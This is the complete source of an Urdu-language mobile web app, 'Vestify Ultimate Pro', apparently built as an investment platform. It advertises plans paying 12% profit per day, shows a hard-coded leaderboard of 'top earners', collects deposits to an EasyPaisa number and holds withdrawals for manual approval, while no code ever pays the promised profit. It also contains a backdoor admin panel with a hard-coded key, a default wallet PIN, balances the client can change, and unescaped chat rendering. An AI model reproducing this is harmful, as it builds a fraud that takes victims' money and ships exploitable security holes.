<html lang="ur" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <title>ویسٹی فائی الٹیمیٹ پرو</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;700;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background-color: #010409; color: white; margin: 0; padding: 0; overflow-x: hidden; text-align: right; }
        .glass { background: rgba(22, 27, 34, 0.75); backdrop-filter: blur(25px); border: 1px solid rgba(255,255,255,0.08); border-radius: 30px; }
        .page { display: none; padding: 20px; animation: slideUp 0.5s cubic-bezier(0.4, 0, 0.2, 1); }
        .active-page { display: block; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
        
        /* Ticker Style */
        .ticker-wrap { background: rgba(59, 130, 246, 0.1); padding: 10px 0; overflow: hidden; border-bottom: 1px solid rgba(59, 130, 246, 0.2); }
        .ticker { display: inline-block; white-space: nowrap; animation: ticker 25s linear infinite; font-size: 10px; font-weight: bold; color: #3b82f6; }
        @keyframes ticker { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }

        /* Chat UI */
        #chat-window { position: fixed; bottom: 100px; left: 20px; right: 20px; height: 420px; z-index: 10000; display: none; flex-direction: column; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
        .msg-user { background: #3b82f6; border-radius: 18px 18px 0 18px; padding: 12px; margin: 5px; align-self: flex-end; font-size: 11px; max-width: 80%; }
        .msg-admin { background: #1f2937; border-radius: 18px 18px 18px 0; padding: 12px; margin: 5px; align-self: flex-start; font-size: 11px; border: 1px solid #374151; max-width: 80%; }

        .nav-bar { position: fixed; bottom: 15px; left: 15px; right: 15px; height: 80px; display: flex; justify-content: space-around; align-items: center; z-index: 5000; border-radius: 30px; background: rgba(22, 27, 34, 0.98); border: 1px solid rgba(255,255,255,0.05); flex-direction: row-reverse; }
        .nav-active { color: #3b82f6; transform: translateY(-8px); }
        
        #wheel { width: 290px; height: 290px; border-radius: 50%; border: 12px solid #d4af37; transition: transform 5s cubic-bezier(0.15, 0, 0.15, 1); }
    </style>
</head>
<body class="pb-36">

    <div class="ticker-wrap">
        <div class="ticker">
            📢 بریکنگ نیوز: ایجنٹ 204 ہیلپ ڈیسک اب 24/7 دستیاب ہے! • نئے VIP پلانز پر 20% اضافی منافع • ویسٹی فائی کے ساتھ اپنی انویسٹمنٹ کو محفوظ بنائیں!
        </div>
    </div>

    <div id="chat-window" class="glass overflow-hidden border-blue-500/30">
        <div class="p-4 bg-gradient-to-r from-blue-600 to-blue-400 flex justify-between items-center">
            <button onclick="clearChat()" class="text-[9px] bg-black/20 px-3 py-1 rounded-full">CLEAR</button>
            <div class="text-right">
                <p class="font-black text-xs uppercase">Agent 204</p>
                <p class="text-[8px] font-bold">Online Support</p>
            </div>
            <button onclick="toggleChat()"><i class="fa-solid fa-times"></i></button>
        </div>
        <div id="chat-msgs" class="flex-1 overflow-y-auto p-4 flex flex-col gap-2 bg-[#0d1117]"></div>
        <div class="p-4 bg-[#161b22] flex gap-2">
            <input id="chat-input" type="text" placeholder="میسج لکھیں..." class="flex-1 bg-white/5 border border-white/10 rounded-2xl p-3 text-xs outline-none">
            <button onclick="sendMsg()" class="bg-blue-600 w-12 rounded-2xl flex items-center justify-center"><i class="fa-solid fa-paper-plane"></i></button>
        </div>
    </div>

    <main id="app-ui">
        <header class="p-6 flex justify-between items-center flex-row-reverse">
            <div class="flex items-center gap-4 flex-row-reverse">
                <img id="user-photo" onclick="handleAdminTap()" class="w-14 h-14 rounded-2xl border-2 border-blue-500/20 cursor-pointer shadow-xl">
                <div class="text-right">
                    <p id="user-name" class="text-xs font-black">Syncing...</p>
                    <p class="text-[8px] font-bold text-blue-500 uppercase">Premium Member</p>
                </div>
            </div>
            <div class="flex gap-2">
                <button onclick="showPage('leaderboard')" class="w-10 h-10 glass flex items-center justify-center text-yellow-500"><i class="fa-solid fa-trophy"></i></button>
                <button onclick="toggleChat()" class="w-10 h-10 glass flex items-center justify-center text-blue-500"><i class="fa-solid fa-headset"></i></button>
            </div>
        </header>

        <div id="p-home" class="page active-page">
            <div class="glass p-8 mb-6 text-center border-blue-500/20 bg-gradient-to-br from-blue-600/10 via-transparent to-transparent">
                <p class="text-[10px] font-black opacity-40 uppercase mb-2">کل بیلنس</p>
                <h2 id="v-bal" class="text-5xl font-black italic mb-8">₨ 0</h2>
                <div class="flex gap-3">
                    <button onclick="showPage('finance')" class="flex-1 bg-white text-black py-4 rounded-xl font-black text-[10px]">DEPOSIT</button>
                    <button onclick="showPage('withdraw')" class="flex-1 glass py-4 rounded-xl font-black text-[10px]">WITHDRAW</button>
                </div>
            </div>
            <div class="flex gap-2 mb-6">
                <button id="btn-n" onclick="renderPlans('normal')" class="flex-1 py-3 rounded-xl bg-blue-600 text-[9px] font-black">NORMAL (START 200)</button>
                <button id="btn-s" onclick="renderPlans('special')" class="flex-1 py-3 rounded-xl bg-white/5 text-[9px] font-black opacity-50">SPECIAL OFFERS</button>
            </div>
            <div id="plans-grid" class="space-y-4 pb-10"></div>
        </div>

        <div id="p-leaderboard" class="page">
            <h2 class="text-2xl font-black italic mb-6 text-right">TOP <span class="text-yellow-500">EARNERS</span></h2>
            <div id="leader-list" class="space-y-3">
                <div class="glass p-4 flex justify-between items-center border-yellow-500/20">
                    <p class="text-xs font-bold">1. @Ahmad_Vest</p>
                    <p class="text-xs font-black text-yellow-500">₨ 850,000</p>
                </div>
                <div class="glass p-4 flex justify-between items-center">
                    <p class="text-xs font-bold">2. @Sara_99</p>
                    <p class="text-xs font-black text-yellow-500">₨ 420,000</p>
                </div>
            </div>
        </div>

        <div id="p-withdraw" class="page">
            <h2 class="text-2xl font-black italic mb-6 text-right uppercase">رقم <span class="text-red-500">نکلوائیں</span></h2>
            <div class="glass p-8 space-y-4">
                <input id="w-num" type="text" placeholder="ایزی پیسہ نمبر" class="w-full bg-black/40 p-4 rounded-xl text-xs border border-white/10 outline-none">
                <input id="w-amt" type="number" placeholder="رقم" class="w-full bg-black/40 p-4 rounded-xl text-xs border border-white/10 outline-none">
                <input id="w-pin" type="password" maxlength="4" placeholder="4-Digit Wallet PIN" class="w-full bg-black/40 p-4 rounded-xl text-center font-black tracking-widest border border-white/10 outline-none">
                <button onclick="submitWithdraw()" class="w-full bg-red-600 py-5 rounded-xl font-black text-xs uppercase">WITHDRAW NOW</button>
            </div>
        </div>

        <div id="p-spin" class="page text-center">
             <h2 class="text-2xl font-black italic mb-10">GOLDEN <span class="text-yellow-500">SPIN</span></h2>
             <div class="flex justify-center mb-10 relative">
                <img id="wheel" src="IMG_20260515_012434.jpg" class="shadow-2xl">
             </div>
             <button id="spin-btn" onclick="executeSpin()" class="w-64 bg-blue-600 py-5 rounded-full font-black">SPIN NOW</button>
        </div>

        <div id="p-finance" class="page">
             <h2 class="text-2xl font-black italic mb-8 text-right">رقم <span class="text-blue-500">جمع کریں</span></h2>
             <div class="glass p-8 space-y-4">
                 <div class="bg-blue-600/10 p-5 rounded-xl text-center border border-blue-500/20">
                     <p class="text-[9px] opacity-50 uppercase">EasyPaisa Account</p>
                     <p class="text-lg font-black text-blue-400">03379827882</p>
                 </div>
                 <input id="d-amt" type="number" placeholder="رقم" class="w-full bg-black/40 p-4 rounded-xl text-xs border border-white/10">
                 <input id="d-tid" type="text" placeholder="Transaction ID (TID)" class="w-full bg-black/40 p-4 rounded-xl text-xs border border-white/10">
                 <button onclick="submitTx('Deposit')" class="w-full bg-blue-600 py-5 rounded-xl font-black text-xs">CONFIRM DEPOSIT</button>
             </div>
        </div>

        <div id="p-history" class="page">
             <h2 class="text-2xl font-black italic mb-6 text-right">ٹرانزیکشن <span class="text-blue-500">ہسٹری</span></h2>
             <div id="history-list" class="space-y-4"></div>
        </div>

        <div id="admin-ui" class="hidden fixed inset-0 z-[20000] bg-black p-6 overflow-y-auto">
            <div class="flex justify-between items-center mb-10">
                <button onclick="closeAdmin()" class="text-red-500 font-bold">CLOSE</button>
                <h2 class="text-xl font-black">ADMIN CONTROL</h2>
            </div>
            <div id="adm-tx-list" class="space-y-4"></div>
        </div>

        <nav class="nav-bar">
            <button onclick="showPage('home')" class="nav-btn" id="nav-home"><i class="fa-solid fa-house"></i></button>
            <button onclick="showPage('spin')" class="nav-btn" id="nav-spin"><i class="fa-solid fa-dharmachakra"></i></button>
            <button onclick="showPage('team')" class="nav-btn" id="nav-team"><i class="fa-solid fa-users"></i></button>
            <button onclick="showPage('history')" class="nav-btn" id="nav-history"><i class="fa-solid fa-history"></i></button>
        </nav>
    </main>

    <script>
        // Firebase Configuration
        const firebaseConfig = { apiKey: "AIzaSyC9ofJ1KxRXHnxilpU9gyI87D3BSOZ9v1g", authDomain: "vestify-991f2.firebaseapp.com", projectId: "vestify-991f2", storageBucket: "vestify-991f2.firebasestorage.app", messagingSenderId: "799007097733", appId: "1:799007097733:web:ed3b35b6c4e51dc2e7baec" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore(), auth = firebase.auth();
        let userObj = null, currentRot = 0, tapCount = 0;

        auth.onAuthStateChanged(async user => {
            if(user) {
                document.getElementById('user-photo').src = user.photoURL;
                document.getElementById('user-name').innerText = user.displayName;
                const userRef = db.collection("users").doc(user.displayName);
                const doc = await userRef.get();
                if(!doc.exists) await userRef.set({ balance: 0, spinCount: 0, teamCount: 0, walletPin: "1234", lastProfit: Date.now() });
                
                syncData(user.displayName);
                renderPlans('normal');
                loadHistory(user.displayName);
                loadChat(user.displayName);
            } else {
                auth.signInWithPopup(new firebase.auth.GoogleAuthProvider());
            }
        });

        // 20+ Plans Logic (Starting 200 PKR)
        function renderPlans(type) {
            let h = "";
            let start = type === 'normal' ? 200 : 5000;
            for(let i=1; i<=15; i++) {
                let cost = start + (i * 500);
                let daily = Math.floor(cost * 0.12);
                h += `<div class="glass p-6 border-white/5">
                    <div class="flex justify-between items-center mb-4">
                        <p class="text-[10px] font-black text-blue-500 uppercase">Vestify Cluster v.${i}</p>
                        <p class="text-xl font-black italic">₨ ${cost}</p>
                    </div>
                    <div class="flex justify-between text-[8px] opacity-60">
                        <span>Daily Profit: ₨ ${daily}</span>
                        <span>Total: ₨ ${daily*30}</span>
                    </div>
                    <button onclick="buyPlan(${cost})" class="w-full bg-white text-black py-3 rounded-xl font-black text-[10px] mt-4 uppercase">Invest Now</button>
                </div>`;
            }
            document.getElementById('plans-grid').innerHTML = h;
        }

        async function buyPlan(c) {
            if(userObj.balance < c) return alert("Balance is low!");
            await db.collection("users").doc(auth.currentUser.displayName).update({ balance: firebase.firestore.FieldValue.increment(-c) });
            alert("Investment Activated! Profit will be added daily.");
        }

        // Withdraw with PIN Security
        async function submitWithdraw() {
            const pin = document.getElementById('w-pin').value;
            const amt = document.getElementById('w-amt').value;
            if(pin !== userObj.walletPin) return alert("Incorrect Wallet PIN!");
            if(amt > userObj.balance) return alert("Insufficient Balance!");

            await submitTx('Withdrawal', amt);
            alert("Withdrawal request sent to Agent 204.");
        }

        // Spin Logic (Match Image Prizes)
        async function executeSpin() {
            const cost = userObj.spinCount > 0 ? 50 : 0;
            if(userObj.balance < cost) return alert("Balance low!");
            const prizes = [{a:0,w:100},{a:45,w:50},{a:90,w:10},{a:135,w:5},{a:180,w:2},{a:225,w:10},{a:270,w:2},{a:315,w:5}];
            const p = prizes[Math.floor(Math.random()*prizes.length)];
            currentRot += 3600 + (360 - p.a);
            document.getElementById('wheel').style.transform = `rotate(${currentRot}deg)`;
            setTimeout(async () => {
                await db.collection("users").doc(auth.currentUser.displayName).update({
                    balance: firebase.firestore.FieldValue.increment(p.w - cost),
                    spinCount: firebase.firestore.FieldValue.increment(1)
                });
                alert(`You Won Rs ${p.w}!`);
            }, 5000);
        }

        // Transaction History
        function loadHistory(name) {
            db.collection("txs").where("user", "==", name).onSnapshot(s => {
                let h = "";
                s.forEach(doc => {
                    const d = doc.data();
                    h += `<div class="glass p-5 flex justify-between items-center">
                        <div class="text-right"><p class="text-[10px] font-black uppercase">${d.type}</p></div>
                        <div class="text-left"><p class="font-black text-sm">₨ ${d.amount}</p><p class="text-[8px] text-yellow-500">${d.status}</p></div>
                    </div>`;
                });
                document.getElementById('history-list').innerHTML = h || "<p class='text-center py-10 opacity-20'>No Records</p>";
            });
        }

        // Agent 204 Chat Logic
        function toggleChat() { 
            const chat = document.getElementById('chat-window');
            chat.style.display = chat.style.display === 'flex' ? 'none' : 'flex';
        }

        async function sendMsg() {
            const input = document.getElementById('chat-input');
            if(!input.value) return;
            await db.collection("chats").add({
                user: auth.currentUser.displayName,
                msg: input.value,
                sender: 'user',
                time: Date.now()
            });
            input.value = "";
        }

        function loadChat(name) {
            db.collection("chats").where("user", "==", name).orderBy("time", "asc").onSnapshot(s => {
                let h = "";
                s.forEach(doc => {
                    const d = doc.data();
                    h += `<div class="${d.sender === 'user' ? 'msg-user' : 'msg-admin'}">${d.msg}</div>`;
                });
                const box = document.getElementById('chat-msgs');
                box.innerHTML = h;
                box.scrollTop = box.scrollHeight;
            });
        }

        async function submitTx(type, customAmt = null) {
            const amt = customAmt || document.getElementById('d-amt').value;
            const tid = document.getElementById('d-tid') ? document.getElementById('d-tid').value : "W-REQ";
            await db.collection("txs").add({
                user: auth.currentUser.displayName,
                amount: parseInt(amt),
                type: type,
                status: "Pending",
                time: Date.now(),
                tid: tid
            });
        }

        function syncData(name) {
            db.collection("users").doc(name).onSnapshot(doc => {
                userObj = doc.data();
                document.getElementById('v-bal').innerText = "₨ " + (userObj.balance || 0).toLocaleString();
            });
        }

        function showPage(p) {
            document.querySelectorAll('.page').forEach(pg => pg.classList.remove('active-page'));
            document.getElementById('p-'+p).classList.add('active-page');
            window.scrollTo(0,0);
        }

        function handleAdminTap() { tapCount++; if(tapCount >= 10) { let k = prompt("Secret Key:"); if(k === "net204") loadAdmin(); tapCount=0; } }
        function loadAdmin() {
            document.getElementById('admin-ui').classList.remove('hidden');
            db.collection("txs").where("status","==","Pending").onSnapshot(s => {
                let h = ""; s.forEach(doc => {
                    const d = doc.data();
                    h += `<div class="glass p-5 mb-4"><p class="text-xs font-bold">${d.user} (${d.type})</p><h2 class="text-xl font-black">₨ ${d.amount}</h2>
                    <div class="flex gap-2 mt-4"><button onclick="approveTx('${doc.id}','${d.user}',${d.amount},'${d.type}')" class="bg-green-600 flex-1 py-2 rounded-lg text-[10px]">APPROVE</button></div></div>`;
                });
                document.getElementById('adm-tx-list').innerHTML = h || "Queue Clear!";
            });
        }
        async function approveTx(id, u, a, type) {
            await db.collection("txs").doc(id).update({status:"Approved"});
            const val = (type === "Deposit") ? a : -a;
            await db.collection("users").doc(u).update({balance: firebase.firestore.FieldValue.increment(val)});
        }
        function closeAdmin() { document.getElementById('admin-ui').classList.add('hidden'); }
    </script>
</body>
</html>
